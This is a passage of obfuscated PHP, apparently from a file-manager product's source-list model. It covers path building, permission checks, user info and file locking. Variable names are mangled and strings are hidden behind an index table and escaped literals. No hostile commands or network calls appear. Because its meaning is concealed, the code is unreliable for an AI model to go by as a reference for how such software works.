$©ë‚ˆ¬[$´®Õ¯¥»[78]]; $¡ù¾ŠÎˆ[$´®Õ¯¥»[32]] = $©ë‚ˆ¬[$´®Õ¯¥»[32]]; if (!$¡ù¾ŠÎˆ[$´®Õ¯¥»[517]]) { Model($´®Õ¯¥»[514])->fileMd5Check($¡ù¾ŠÎˆ); } if (!isset(self::$cacheFileInfo[$´®Õ¯¥»[518] . $Ñ…Ä Ì])) { self::$cacheFileInfo[$´®Õ¯¥»[518] . $Ñ…Ä Ì] = array_merge(array(), $¡ù¾ŠÎˆ); } unset($­éï—ÎÙ[$Ñ…Ä Ì][$´®Õ¯¥»[86]]); $ÏÙæó‚ê = is_array($Ô­–ÌÇü[$Ñ…Ä Ì]) ? $Ô­–ÌÇü[$Ñ…Ä Ì] : array(); $©ë‚ˆ¬[$´®Õ¯¥»[519]] = array_merge($ÏÙæó‚ê, $­éï—ÎÙ[$Ñ…Ä Ì]); if (isset($©ë‚ˆ¬[$´®Õ¯¥»[519]][$´®Õ¯¥»[173]])) { $©ë‚ˆ¬[$´®Õ¯¥»[173]] = json_decode($©ë‚ˆ¬[$´®Õ¯¥»[519]][$´®Õ¯¥»[173]], !0); unset($©ë‚ˆ¬[$´®Õ¯¥»[519]][$´®Õ¯¥»[173]]); } } unset($©ë‚ˆ¬); } protected function _listAppendSourceInfo(&$™µßúÀÜ, $ÉÅÅğËÒ) { $ŞÆì’–î =& $_SERVER[ ÇƒŠìÀ]; $¹ÑÌ¯ŠÚ = Model($ŞÆì’–î[520])->listData(); $áƒ…˜¾ = Model($ŞÆì’–î[469])->listData(); $öıÃ®’† = Model($ŞÆì’–î[459])->listData(); $ÖŠ…ÍÌœ = Model($ŞÆì’–î[521])->listSimple(); $¹õŒ€ŠÜ = array_to_keyvalue($¹ÑÌ¯ŠÚ, $ŞÆì’–î[445]); $»©÷¨‹Ê = array_to_keyvalue_group($áƒ…˜¾, $ŞÆì’–î[86], $ŞÆì’–î[470]); $Îù ĞÍ™ = array_to_keyvalue($öıÃ®’†, $ŞÆì’–î[86]); $Á‰ß¨ô = array_to_keyvalue_group($ÖŠ…ÍÌœ, $ŞÆì’–î[183]); foreach ($™µßúÀÜ as &$äºØŠæ˜) { $äºØŠæ˜[$ŞÆì’–î[89]] = array($ŞÆì’–î[522] => 0, $ŞÆì’–î[523] => 0, $ŞÆì’–î[524] => 0); if (isset($Îù ĞÍ™[$äºØŠæ˜[$ŞÆì’–î[183]]])) { $äºØŠæ˜[$ŞÆì’–î[89]][$ŞÆì’–î[525]] = 1; $äºØŠæ˜[$ŞÆì’–î[89]][$ŞÆì’–î[526]] = $Îù ĞÍ™[$äºØŠæ˜[$ŞÆì’–î[183]]][$ŞÆì’–î[32]]; } if ($»©÷¨‹Ê && $¹õŒ€ŠÜ && isset($»©÷¨‹Ê[$äºØŠæ˜[$ŞÆì’–î[183]]])) { $äºØŠæ˜[$ŞÆì’–î[89]][$ŞÆì’–î[527]] = array(); foreach ($»©÷¨‹Ê[$äºØŠæ˜[$ŞÆì’–î[183]]] as $‹²½—ÜÖ) { $¯¤‹Ã©ç = $¹õŒ€ŠÜ[$‹²½—ÜÖ]; $äºØŠæ˜[$ŞÆì’–î[89]][$ŞÆì’–î[527]][] = array($ŞÆì’–î[528] => $¯¤‹Ã©ç[$ŞÆì’–î[445]], $ŞÆì’–î[464] => $¯¤‹Ã©ç[$ŞÆì’–î[32]], $ŞÆì’–î[529] => $¯¤‹Ã©ç[$ŞÆì’–î[530]]); } } if ($Á‰ß¨ô && isset($Á‰ß¨ô[$äºØŠæ˜[$ŞÆì’–î[183]]])) { $äºØŠæ˜[$ŞÆì’–î[89]][$ŞÆì’–î[531]] = array(); foreach ($Á‰ß¨ô[$äºØŠæ˜[$ŞÆì’–î[183]]] as $ì—î®˜) { $¸ğéàï± = $ŞÆì’–î[532]; if ($ì—î®˜[$ŞÆì’–î[533]] == $ŞÆì’–î[90]) { $¸ğéàï± .= $ŞÆì’–î[534]; } $äºØŠæ˜[$ŞÆì’–î[89]][$ŞÆì’–î[531]] = array_field_key($ì—î®˜, explode($ŞÆì’–î[50], $¸ğéàï±)); } } } unset($äºØŠæ˜); return $™µßúÀÜ; } protected function _listAppendChildren(&$Ïï›§Ñ, $½æçŒÈ) { $Û«À¿ =& $_SERVER[ ÇƒŠìÀ]; $é™Øøã = array(); $ËäÌ²Ã× = array($Û«À¿[225] => 0, $Û«À¿[226] => 0); foreach ($Ïï›§Ñ as &$ÇÉÔÎ¶) { if (!$ÇÉÔÎ¶[$Û«À¿[455]]) { continue; } $é™Øøã[] = $ÇÉÔÎ¶[$Û«À¿[183]]; } unset($ÇÉÔÎ¶); if (!$é™Øøã) { return; } $ß¿ï¶Íº = array($Û«À¿[182] => array($Û«À¿[7], $é™Øøã), $Û«À¿[475] => 0); $ÚÃÈÏÆ¯ = array($Û«À¿[182], $Û«À¿[455], $Û«À¿[535] => $Û«À¿[536]); $°’ˆ–¶ = $this->field($ÚÃÈÏÆ¯)->where($ß¿ï¶Íº)->group($Û«À¿[537])->select(); $ÁÍÑÚÓ = array(); foreach ($°’ˆ–¶ as $î€¹Ë˜ò) { $½î›Ã÷à = $î€¹Ë˜ò[$Û«À¿[182]]; $ÖÌËï´œ = $î€¹Ë˜ò[$Û«À¿[455]] == $Û«À¿[90] ? $Û«À¿[226] : $Û«À¿[225]; if (!isset($ÁÍÑÚÓ[$½î›Ã÷à])) { $ÁÍÑÚÓ[$½î›Ã÷à] = array($Û«À¿[225] => 0, $Û«À¿[226] => 0); } $ÁÍÑÚÓ[$½î›Ã÷à][$ÖÌËï´œ] += $î€¹Ë˜ò[$Û«À¿[536]]; } foreach ($Ïï›§Ñ as &$ÇÉÔÎ¶) { if (!$ÇÉÔÎ¶[$Û«À¿[455]]) { continue; } $ Øœ¤Ÿ“ = is_array($ÁÍÑÚÓ[$ÇÉÔÎ¶[$Û«À¿[183]]]) ? $ÁÍÑÚÓ[$ÇÉÔÎ¶[$Û«À¿[183]]] : $ËäÌ²Ã×; $ÇÉÔÎ¶[$Û«À¿[226]] = $ Øœ¤Ÿ“[$Û«À¿[226]]; $ÇÉÔÎ¶[$Û«À¿[225]] = $ Øœ¤Ÿ“[$Û«À¿[225]]; unset($ÇÉÔÎ¶[$Û«À¿[456]]); } unset($ÇÉÔÎ¶); } protected function _listAppendAuth(&$õè“ıãì) { $”‰­È—Ñ =& $_SERVER[ ÇƒŠìÀ]; $íÂÜşü = array(); foreach ($õè“ıãì as $Ò‚„Ğ›Ó) { if ($Ò‚„Ğ›Ó[$”‰­È—Ñ[180]] == self::TYPE_GROUP) { $íÂÜşü[] = $Ò‚„Ğ›Ó[$”‰­È—Ñ[183]]; } } if (!$íÂÜşü) { return; } $À˜”®™ = array_to_keyvalue($õè“ıãì, $”‰­È—Ñ[183]); $Ñ Î°Ğ = Model($”‰­È—Ñ[538])->getSourceList($íÂÜşü, $À˜”®™); $Óèòûûñ = KodUser::isRoot(); foreach ($õè“ıãì as $Î¹¹À·º => &$Ò‚„Ğ›Ó) { $Ò‚„Ğ›Ó[$”‰­È—Ñ[457]] = $Ñ Î°Ğ[$Ò‚„Ğ›Ó[$”‰­È—Ñ[183]]]; if (!$Ò‚„Ğ›Ó[$”‰­È—Ñ[457]] && $Ò‚„Ğ›Ó[$”‰­È—Ñ[180]] == self::TYPE_GROUP) { $Ò‚„Ğ›Ó[$”‰­È—Ñ[457]] = Action($”‰­È—Ñ[539])->pathGroupAuthMake($Ò‚„Ğ›Ó[$”‰­È—Ñ[540]]); if (!$Ò‚„Ğ›Ó[$”‰­È—Ñ[457]] && !$Óèòûûñ) { $Ò‚„Ğ›Ó[$”‰­È—Ñ[219]] = !1; $Ò‚„Ğ›Ó[$”‰­È—Ñ[218]] = !1; } } if ($Ò‚„Ğ›Ó[$”‰­È—Ñ[457]]) { $Ò‚„Ğ›Ó[$”‰­È—Ñ[219]] = AuthModel::authCheckEdit($Ò‚„Ğ›Ó[$”‰­È—Ñ[457]][$”‰­È—Ñ[458]]); $Ò‚„Ğ›Ó[$”‰­È—Ñ[218]] = AuthModel::authCheckView($Ò‚„Ğ›Ó[$”‰­È—Ñ[457]][$”‰­È—Ñ[458]]); } $this->groupPathDisplay($Ò‚„Ğ›Ó); } unset($Ò‚„Ğ›Ó); } public function _listAppendAuthSecret(&$»š´ñ£Ò) { $¥ñõ =& $_SERVER[ ÇƒŠìÀ]; if (Model($¥ñõ[478])->get($¥ñõ[541]) != $¥ñõ[90]) { return; } static $‹—©í¨ = false; if (!$‹—©í¨) { $“ÜêÅ¥ƒ = Model($¥ñõ[542]); $£Š˜ÀÅ¬ = Model($¥ñõ[543]); $‹—©í¨ = $£Š˜ÀÅ¬->listData(); $‹—©í¨ = array_to_keyvalue($‹—©í¨, $¥ñõ[183]); $¨È±„³ä = json_decode(Model($¥ñõ[478])->get($¥ñõ[544]), !0); $¨È±„³ä = array_to_keyvalue($¨È±„³ä, $¥ñõ[445]); foreach ($‹—©í¨ as $àŞëÔ÷Ù => $†á«å‘¡) { $ÜÏâî·ê = $¨È±„³ä[$†á«å‘¡[$¥ñõ[545]]]; if (!$ÜÏâî·ê) { $£Š˜ÀÅ¬->remove($†á«å‘¡[$¥ñõ[445]]); unset($‹—©í¨[$àŞëÔ÷Ù]); continue; } $´Š›¯³Å = $“ÜêÅ¥ƒ->listData($ÜÏâî·ê[$¥ñõ[457]]); if (!$´Š›¯³Å) { $£Š˜ÀÅ¬->remove($†á«å‘¡[$¥ñõ[445]]); unset($‹—©í¨[$àŞëÔ÷Ù]); continue; } $†á«å‘¡[$¥ñõ[457]] = $´Š›¯³Å; $†á«å‘¡[$¥ñõ[546]] = $ÜÏâî·ê; $†á«å‘¡[$¥ñõ[547]] = Model($¥ñõ[548])->getInfoSimpleOuter($†á«å‘¡[$¥ñõ[497]]); $‹—©í¨[$àŞëÔ÷Ù] = $†á«å‘¡; } } $¢ûˆµ = USER_ID; $‹†‘İ = array(); $Ãª —å = $this->_listAppendPath($‹†‘İ, !0); foreach ($»š´ñ£Ò as $àŞëÔ÷Ù => &$†á«å‘¡) { if (!is_array($†á«å‘¡[$¥ñõ[457]])) { continue; } if ($†á«å‘¡[$¥ñõ[180]] != $¥ñõ[549]) { continue; } if (isset($‹—©í¨[$†á«å‘¡[$¥ñõ[183]]])) { $ßˆÃ¦âõ = $‹—©í¨[$†á«å‘¡[$¥ñõ[183]]]; if (!is_array($†á«å‘¡[$¥ñõ[509]])) { $†á«å‘¡[$¥ñõ[509]] = array(); } $†á«å‘¡[$¥ñõ[509]][$¥ñõ[550]] = $ßˆÃ¦âõ[$¥ñõ[545]]; $†á«å‘¡[$¥ñõ[457]][$¥ñõ[551]] = $ßˆÃ¦âõ; $†á«å‘¡[$¥ñõ[457]][$¥ñõ[552]] = $†á«å‘¡[$¥ñõ[553]]; $†á«å‘¡[$¥ñõ[457]][$¥ñõ[554]] = $¥ñõ[90]; if ($ßˆÃ¦âõ[$¥ñõ[497]] != $¢ûˆµ) { $†á«å‘¡[$¥ñõ[457]][$¥ñõ[458]] = $†á«å‘¡[$¥ñõ[457]][$¥ñõ[458]] & $ßˆÃ¦âõ[$¥ñõ[457]][$¥ñõ[457]]; } continue; } $Ğû“ÒÖ¬ = $this->parentLevelArray($†á«å‘¡[$¥ñõ[555]]); $Â¿»åÖ = array_reverse($Ğû“ÒÖ¬); foreach ($Â¿»åÖ as $éõÑĞ• => $œ‚Ü¿¡æ) { if (!isset($‹—©í¨[$œ‚Ü¿¡æ])) { continue; } $ßˆÃ¦âõ = $‹—©í¨[$œ‚Ü¿¡æ]; $†á«å‘¡[$¥ñõ[457]][$¥ñõ[551]] = $ßˆÃ¦âõ; if ($ßˆÃ¦âõ[$¥ñõ[497]] != $¢ûˆµ) { $†á«å‘¡[$¥ñõ[457]][$¥ñõ[458]] = $†á«å‘¡[$¥ñõ[457]][$¥ñõ[458]] & $ßˆÃ¦âõ[$¥ñõ[457]][$¥ñõ[457]]; } $—¼ÍÑ«Ö = $¥ñõ[12]; $‹èõ®€Ñ = count($Ğû“ÒÖ¬) - $éõÑĞ•; for ($îà‘İëï = 0; $îà‘İëï < $‹èõ®€Ñ; $îà‘İëï++) { if (!isset($Ãª —å[$Ğû“ÒÖ¬[$îà‘İëï]])) { $—¼ÍÑ«Ö = $¥ñõ[12]; break; } $—¼ÍÑ«Ö = $—¼ÍÑ«Ö . rtrim($Ãª —å[$Ğû“ÒÖ¬[$îà‘İëï]], $¥ñõ[8]) . $¥ñõ[8]; } $†á«å‘¡[$¥ñõ[457]][$¥ñõ[552]] = rtrim($—¼ÍÑ«Ö, $¥ñõ[8]) . $¥ñõ[8]; break; } } unset($†á«å‘¡); } public function groupPathDisplay(&$ìãûèÎó) { $ëòå„µ› =& $_SERVER[ ÇƒŠìÀ]; if ($ìãûèÎó[$ëòå„µ›[180]] != self::TYPE_GROUP) { return; } $üŸ–Ü³æ = Model($ëòå„µ›[556])->getInfo($ìãûèÎó[$ëòå„µ›[540]]); $€ë—Ÿ´† = $this->parentLevelArray($üŸ–Ü³æ[$ëòå„µ›[555]]); $ù‘´ıƒ¯ = $ëòå„µ›[12]; foreach ($€ë—Ÿ´† as $Éß¸„—Ä) { $†œ»öçì = Model($ëòå„µ›[556])->getInfo($Éß¸„—Ä); $ù‘´ıƒ¯ .= $†œ»öçì[$ëòå„µ›[89]][$ëòå„µ›[183]] . $ëòå„µ›[50]; } $ìãûèÎó[$ëòå„µ›[557]] = $üŸ–Ü³æ[$ëòå„µ›[182]]; $ìãûèÎó[$ëòå„µ›[558]] = $üŸ–Ü³æ[$ëòå„µ›[555]]; $ìãûèÎó[$ëòå„µ›[559]] = $üŸ–Ü³æ[$ëòå„µ›[560]]; $ìãûèÎó[$ëòå„µ›[561]] = $ù‘´ıƒ¯ . $üŸ–Ü³æ[$ëòå„µ›[89]][$ëòå„µ›[183]]; } protected function _listAppendPath(&$ê»ßÜ‰÷, $Àü—Ãä¿ = false) { $úÊ´Šöñ =& $_SERVER[ ÇƒŠìÀ]; static $óğøÃà² = array(); $®ÒĞ° = array(); $ªº±ñ· = array(); if ($Àü—Ãä¿) { return $óğøÃà²; } foreach ($ê»ßÜ‰÷ as &$™»ö‘ßä) { $€—™ïä = $™»ö‘ßä[$úÊ´Šöñ[183]]; if ($™»ö‘ßä[$úÊ´Šöñ[455]] == $úÊ´Šöñ[90] && $™»ö‘ßä[$úÊ´Šöñ[182]] != 0) { $óğøÃà²[$€—™ïä] = $™»ö‘ßä[$úÊ´Šöñ[32]]; } if ($™»ö‘ßä[$úÊ´Šöñ[455]] == $úÊ´Šöñ[90] && $™»ö‘ßä[$úÊ´Šöñ[182]] == 0) { $óğøÃà²[$€—™ïä] = $this->_listAppendPathRoot($™»ö‘ßä, array()); } if (isset($ªº±ñ·[$™»ö‘ßä[$úÊ´Šöñ[555]]])) { continue; } $ªº±ñ·[$™»ö‘ßä[$úÊ´Šöñ[555]]] = !0; $º¸îÙÍš = $this->parentLevelArray($™»ö‘ßä[$úÊ´Šöñ[555]]); foreach ($º¸îÙÍš as $Î£È—Ÿ => $Œáª†¤Û) { if (isset($óğøÃà²[$Œáª†¤Û])) { continue; } if ($Î£È—Ÿ == 0) { $óğøÃà²[$Œáª†¤Û] = $this->_listAppendPathRoot($™»ö‘ßä, $º¸îÙÍš); } if ($Î£È—Ÿ != 0) { $®ÒĞ°[] = $Œáª†¤Û; } } } unset($™»ö‘ßä); $®ÒĞ° = array_unique($®ÒĞ°); if (count($®ÒĞ°) > 0) { $¡ú™ôø = array($úÊ´Šöñ[461] => array($úÊ´Šöñ[462], $®ÒĞ°)); if (count($®ÒĞ°) == 1) { $‰Ì½²¬¦ = $this->sourceInfo($®ÒĞ°[0]); $‘£õŒÏ = is_array($‰Ì½²¬¦) ? array($‰Ì½²¬¦) : !1; } else { $‘£õŒÏ = $this->field($úÊ´Šöñ[562])->where($¡ú™ôø)->select(); } if (!$‘£õŒÏ) { $‘£õŒÏ = array(); } foreach ($‘£õŒÏ as $í›¸úşò) { $óğøÃà²[$í›¸úşò[$úÊ´Šöñ[183]]] = $í›¸úşò[$úÊ´Šöñ[32]]; } } $Óüì—‚ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $›Ø˜Š‚ô = array(); foreach ($ê»ßÜ‰÷ as &$™»ö‘ßä) { $Õ¦ñõÉ = $™»ö‘ßä[$úÊ´Šöñ[555]]; $—¥µßû¸ = $úÊ´Šöñ[12]; if (isset($›Ø˜Š‚ô[$Õ¦ñõÉ])) { $—¥µßû¸ = $›Ø˜Š‚ô[$Õ¦ñõÉ]; } else { $º¸îÙÍš = $this->parentLevelArray($™»ö‘ßä[$úÊ´Šöñ[555]]); foreach ($º¸îÙÍš as $Î£È—Ÿ => $Œáª†¤Û) { if (isset($óğøÃà²[$Œáª†¤Û])) { $—¥µßû¸ .= $óğøÃà²[$Œáª†¤Û] . $úÊ´Šöñ[8]; } } $›Ø˜Š‚ô[$Õ¦ñõÉ] = $—¥µßû¸; } $—¥µßû¸ .= $™»ö‘ßä[$úÊ´Šöñ[32]]; if ($™»ö‘ßä[$úÊ´Šöñ[455]] == $úÊ´Šöñ[90]) { $—¥µßû¸ .= $úÊ´Šöñ[8]; } $™»ö‘ßä[$úÊ´Šöñ[553]] = str_replace($úÊ´Šöñ[563], $úÊ´Šöñ[8], $—¥µßû¸); if ($™»ö‘ßä[$úÊ´Šöñ[182]] == $úÊ´Šöñ[214]) { $™»ö‘ßä[$úÊ´Šöñ[32]] = trim($óğøÃà²[$™»ö‘ßä[$úÊ´Šöñ[183]]], $úÊ´Šöñ[8]); $™»ö‘ßä[$úÊ´Šöñ[553]] = $™»ö‘ßä[$úÊ´Šöñ[32]] . $úÊ´Šöñ[8]; } if (intval($™»ö‘ßä[$úÊ´Šöñ[180]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($™»ö‘ßä, $º¸îÙÍš, $Óüì—‚); } } unset($™»ö‘ßä); return $ê»ßÜ‰÷; } private function _listAppendPathRecycle(&$ĞùÒë¨Ñ, $±¾ƒ¨¬›, $ÕúúŞÃö) { $–İƒÉŠÇ =& $_SERVER[ ÇƒŠìÀ]; if (!in_array($ÕúúŞÃö, $±¾ƒ¨¬›) && $ĞùÒë¨Ñ[$–İƒÉŠÇ[183]] != $ÕúúŞÃö) { return; } $Ã©Êùç = explode($–İƒÉŠÇ[8], trim($ĞùÒë¨Ñ[$–İƒÉŠÇ[553]], $–İƒÉŠÇ[8])); $öÍ³ÉÆõ = implode($–İƒÉŠÇ[8], array_slice($Ã©Êùç, 2)); $ĞùÒë¨Ñ[$–İƒÉŠÇ[553]] = $–İƒÉŠÇ[8] . LNG($–İƒÉŠÇ[564]) . $–İƒÉŠÇ[8] . ltrim($öÍ³ÉÆõ, $–İƒÉŠÇ[8]); $ĞùÒë¨Ñ[$–İƒÉŠÇ[555]] = $–İƒÉŠÇ[565] . implode($–İƒÉŠÇ[50], array_slice($±¾ƒ¨¬›, 1)) . $–İƒÉŠÇ[50]; if ($ĞùÒë¨Ñ[$–İƒÉŠÇ[183]] == $ÕúúŞÃö) { $ĞùÒë¨Ñ[$–İƒÉŠÇ[555]] = $–İƒÉŠÇ[565]; $ĞùÒë¨Ñ[$–İƒÉŠÇ[182]] = $–İƒÉŠÇ[214]; $ĞùÒë¨Ñ[$–İƒÉŠÇ[32]] = LNG($–İƒÉŠÇ[564]); } $ĞùÒë¨Ñ[$–İƒÉŠÇ[566]] = $–İƒÉŠÇ[567]; } protected function _listAppendPathRoot(&$¯Ÿƒ«™ , $´·¢ßŠÌ) { $ËÚ»ªá =& $_SERVER[ ÇƒŠìÀ]; static $Ïû¯”Â¨ = false; $Á­ò¿©Â = $ËÚ»ªá[12]; if ($¯Ÿƒ«™ [$ËÚ»ªá[180]] == self::TYPE_USER) { if ($¯Ÿƒ«™ [$ËÚ»ªá[540]] == USER_ID) { $Á­ò¿©Â = LNG($ËÚ»ªá[568]); if ($Ïû¯”Â¨ === !1) { $°ÚÒÙ×Ğ = Model($ËÚ»ªá[569])->getInfoFull(USER_ID); $Ïû¯”Â¨ = _get($°ÚÒÙ×Ğ, $ËÚ»ªá[570], $ËÚ»ªá[12]); } if ($´·¢ßŠÌ && $´·¢ßŠÌ[0] == $Ïû¯”Â¨ || !$´·¢ßŠÌ && $¯Ÿƒ«™ [$ËÚ»ªá[183]] == $Ïû¯”Â¨) { $Á­ò¿©Â = LNG($ËÚ»ªá[571]); $¯Ÿƒ«™ [$ËÚ»ªá[572]] = $ËÚ»ªá[573]; } if (!$´·¢ßŠÌ) { $¯Ÿƒ«™ [$ËÚ»ªá[32]] = $Á­ò¿©Â; } } else { $¯Ÿƒ«™ [$ËÚ»ªá[574]] = Model($ËÚ»ªá[548])->getInfoSimpleOuter($¯Ÿƒ«™ [$ËÚ»ªá[540]]); $Á­ò¿©Â = LNG($ËÚ»ªá[575]) . $ËÚ»ªá[165] . $¯Ÿƒ«™ [$ËÚ»ªá[574]][$ËÚ»ªá[32]] . $ËÚ»ªá[167]; } } else { if ($¯Ÿƒ«™ [$ËÚ»ªá[180]] == self::TYPE_GROUP) { $´íî–Ôù = Model($ËÚ»ªá[556])->getInfoSimple($¯Ÿƒ«™ [$ËÚ»ªá[540]]); $Á­ò¿©Â = $´íî–Ôù[$ËÚ»ªá[32]]; } else { if ($¯Ÿƒ«™ [$ËÚ»ªá[180]] == self::TYPE_SYSTEM) { $Á­ò¿©Â = $ËÚ»ªá[576]; } } } $Á­ò¿©Â = $Á­ò¿©Â ? $ËÚ»ªá[8] . $Á­ò¿©Â . $ËÚ»ªá[8] : $ËÚ»ªá[8]; return $Á­ò¿©Â; } protected function _listAppendUser(&$Õã¡ˆ¾) { $˜‹… ªı =& $_SERVER[ ÇƒŠìÀ]; $İŠÃŞßÆ = array_to_keyvalue($Õã¡ˆ¾, $˜‹… ªı[12], $˜‹… ªı[497]); $Ó·ÚÌÓÆ = array_to_keyvalue($Õã¡ˆ¾, $˜‹… ªı[12], $˜‹… ªı[499]); $ÆâÒÄğ• = array_merge($İŠÃŞßÆ, $Ó·ÚÌÓÆ); $¤©¹å = Model($˜‹… ªı[569])->userListInfo($ÆâÒÄğ•); foreach ($Õã¡ˆ¾ as &$“¬Ğ”Ü) { $£ÔŸšì† = $“¬Ğ”Ü[$˜‹… ªı[497]]; $“¬Ğ”Ü[$˜‹… ªı[497]] = $¤©¹å[$£ÔŸšì†] ? $¤©¹å[$£ÔŸšì†] : !1; $£ÔŸšì† = $“¬Ğ”Ü[$˜‹… ªı[499]]; $“¬Ğ”Ü[$˜‹… ªı[499]] = $¤©¹å[$£ÔŸšì†] ? $¤©¹å[$£ÔŸšì†] : !1; if (isset($“¬Ğ”Ü[$˜‹… ªı[509]]) && $“¬Ğ”Ü[$˜‹… ªı[509]][$˜‹… ªı[577]]) { $’İ•Şº° = $GLOBALS[$˜‹… ªı[6]][$˜‹… ªı[91]][$˜‹… ªı[578]]; if ($“¬Ğ”Ü[$˜‹… ªı[509]][$˜‹… ªı[579]] <= time() - $’İ•Şº°) { $this->metaSet($“¬Ğ”Ü[$˜‹… ªı[183]], $˜‹… ªı[577], null); $this->metaSet($“¬Ğ”Ü[$˜‹… ªı[183]], $˜‹… ªı[579], null); unset($“¬Ğ”Ü[$˜‹… ªı[509]][$˜‹… ªı[577]]); continue; } $æè€ï = $“¬Ğ”Ü[$˜‹… ªı[509]][$˜‹… ªı[577]]; $“¬Ğ”Ü[$˜‹… ªı[509]][$˜‹… ªı[580]] = Model($˜‹… ªı[569])->getInfoSimpleOuter($æè€ï); } } unset($“¬Ğ”Ü); } public function parentLevelArray($ûˆÆœ€˜) { $Ê¹Ÿı =& $_SERVER[ ÇƒŠìÀ]; $ûˆÆœ€˜ = explode($Ê¹Ÿı[50], trim($ûˆÆœ€˜, $Ê¹Ÿı[50])); return array_remove_value($ûˆÆœ€˜, $Ê¹Ÿı[214]); } public function listAll($ŸÁç½½) { $Ğ”„­„° =& $_SERVER[ ÇƒŠìÀ]; $°·êÍì = $this->sourceInfo($ŸÁç½½); $—‹½ù¸ = array($Ğ”„­„°[581] => array($Ğ”„­„°[582], $°·êÍì[$Ğ”„­„°[555]] . $ŸÁç½½ . $Ğ”„­„°[583]), $Ğ”„­„°[584] => 0); $º÷Ï±€¬ = $Ğ”„­„°[585]; $›ÊçÚÊ = "\114\105\x46\x54\x20\112\117\111\116\40{$this->tablePrefix}\x69\157\x5f\146\151\154\145\x20\146\x69\x6c\145\x20\157\x6e\x20\163\157\x75\162\x63\145\56\146\151\x6c\x65\x49\104\x20\x3d\40\146\151\154\x65\56\x66\151\x6c\145\111\x44"; $Ğ‘è³™Ö = $this->alias($Ğ”„­„°[489])->field($º÷Ï±€¬)->where($—‹½ù¸)->join($›ÊçÚÊ)->select(); $this->_listAppendAuth($Ğ‘è³™Ö); $this->_listAppendUser($Ğ‘è³™Ö); $this->_listAppendPath($Ğ‘è³™Ö); $Ğ‘è³™Ö = array_to_keyvalue($Ğ‘è³™Ö, $Ğ”„­„°[183]); $äÜ•€Å = "\x2f{$°·êÍì[$Ğ”„­„°[32]]}\57"; $äÜ•€Å = $äÜ•€Å == $Ğ”„­„°[563] ? $Ğ”„­„°[8] : $äÜ•€Å; $äøñ²ïó = array(); foreach ($Ğ‘è³™Ö as $Áúá¨Œ => $ŸïÄ¡£Ÿ) { $ÀŒÁĞëª = $this->parentLevelArray($ŸïÄ¡£Ÿ[$Ğ”„­„°[555]]); array_shift($ÀŒÁĞëª); $Š«·‘Àó = $äÜ•€Å; for ($Ûû¡ƒ¼É = 0; $Ûû¡ƒ¼É < count($ÀŒÁĞëª); $Ûû¡ƒ¼É++) { $Š«·‘Àó .= $Ğ‘è³™Ö[$ÀŒÁĞëª[$Ûû¡ƒ¼É]][$Ğ”„­„°[32]] . $Ğ”„­„°[8]; } $Š«·‘Àó .= $ŸïÄ¡£Ÿ[$Ğ”„­„°[32]]; if ($ŸïÄ¡£Ÿ[$Ğ”„­„°[455]]) { $Š«·‘Àó .= $Ğ”„­„°[8]; } $ô¶Æ¨Á« = array($Ğ”„­„°[465] => str_replace($Ğ”„­„°[563], $Ğ”„­„°[8], str_replace($Ğ”„­„°[563], $Ğ”„­„°[8], str_replace($Ğ”„­„°[563], $Ğ”„­„°[8], $Š«·‘Àó))), $Ğ”„­„°[586] => intval($ŸïÄ¡£Ÿ[$Ğ”„­„°[455]]), $Ğ”„­„°[587] => intval($ŸïÄ¡£Ÿ[$Ğ”„­„°[78]]), $Ğ”„­„°[87] => intval($ŸïÄ¡£Ÿ[$Ğ”„­„°[87]]), $Ğ”„­„°[89] => $this->pathInfoFilter($ŸïÄ¡£Ÿ)); if (!$ô¶Æ¨Á«[$Ğ”„­„°[455]]) { $ô¶Æ¨Á«[$Ğ”„­„°[511]] = $ŸïÄ¡£Ÿ[$Ğ”„­„°[511]]; } $äøñ²ïó[] = $ô¶Æ¨Á«; } $äøñ²ïó = array_sort_by($äøñ²ïó, $Ğ”„­„°[86]); return $äøñ²ïó; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($íœÇ…Í) { $âçı—Ï =& $_SERVER[ ÇƒŠìÀ]; if (!$this->allowLock()) { return; } $this->_lockCheck($âçı—Ï[588], $íœÇ…Í); $¥½Áı¥ş = 1; $this->_lockEvent($íœÇ…Í, array($âçı—Ï[589], $âçı—Ï[590]), $¥½Áı¥ş); $this->_lockParent($íœÇ…Í, array($âçı—Ï[590]), $¥½Áı¥ş); $this->_lockEvent($íœÇ…Í, array($âçı—Ï[591], $âçı—Ï[592]), $¥½Áı¥ş); $this->_lockCheckEnd($âçı—Ï[588], $íœÇ…Í); } public function lockCopyEnd($¹£Ë‘åÓ) { $À†‡Œ‡¤ =& $_SERVER[ ÇƒŠìÀ]; if (!$this->allowLock()) { return; } $¿¢İéıè = 0; $this->_lockEvent($¹£Ë‘åÓ, array($À†‡Œ‡¤[589], $À†‡Œ‡¤[590]), $¿¢İéıè); $this->_lockParent($¹£Ë‘åÓ, array($À†‡Œ‡¤[590]), $¿¢İéıè); $this->_lockEvent($¹£Ë‘åÓ, array($À†‡Œ‡¤[591], $À†‡Œ‡¤[592]), $¿¢İéıè); } public function lockWriteStart($”Ù…š†â, $¯ø³¸¤ˆ = '') { $¥Îµ”±Ğ =& $_SERVER[ ÇƒŠìÀ]; if (!$this->allowLock()) { return; } $this->_lockCheck($¥Îµ”±Ğ[589], $”Ù…š†â); $óÊÃÜÜÀ = 1; $this->_lockKey($¥Îµ”±Ğ[593] . $”Ù…š†â . $¥Îµ”±Ğ[10] . $¯ø³¸¤ˆ, $óÊÃÜÜÀ); $this->_lockEvent($”Ù…š†â, array($¥Îµ”±Ğ[588], $¥Îµ”±Ğ[590]), $óÊÃÜÜÀ); $this->_lockParent($”Ù…š†â, array($¥Îµ”±Ğ[588], $¥Îµ”±Ğ[590]), $óÊÃÜÜÀ); $this->_lockCheckEnd($¥Îµ”±Ğ[589], $”Ù…š†â); } public function lockWriteEnd($ñ†òŸ¶, $Ó ¤˜ê = '') { $·½í¦‹Ó =& $_SERVER[ ÇƒŠìÀ]; if (!$this->allowLock()) { return; } $ì´«””ä = 0; $this->_lockKey($·½í¦‹Ó[593] . $ñ†òŸ¶ . $·½í¦‹Ó[10] . $Ó ¤˜ê, $ì´«””ä); $this->_lockEvent($ñ†òŸ¶, array($·½í¦‹Ó[588], $·½í¦‹Ó[590]), $ì´«””ä); $this->_lockParent($ñ†òŸ¶, array($·½í¦‹Ó[588], $·½í¦‹Ó[590]), $ì´«””ä); } public function 